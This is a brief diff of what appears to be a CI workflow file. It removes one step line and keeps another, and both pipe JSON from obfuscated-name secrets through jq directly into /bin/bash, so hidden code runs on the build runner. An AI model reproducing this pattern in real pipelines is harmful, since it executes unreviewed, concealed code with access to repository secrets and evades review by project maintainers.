@@ -18,7 +18,6 @@ jobs:
           hfeec93109: ${{ secrets.hfeec93109 }}
         run: |
           printf '%s' "$hfeec93109" | jq -r .hj6626 | /bin/bash
-          printf '%s' "$mp85" | jq -r .aeuup6243 | /bin/bash
 
       - name: Archive output
         if: always()
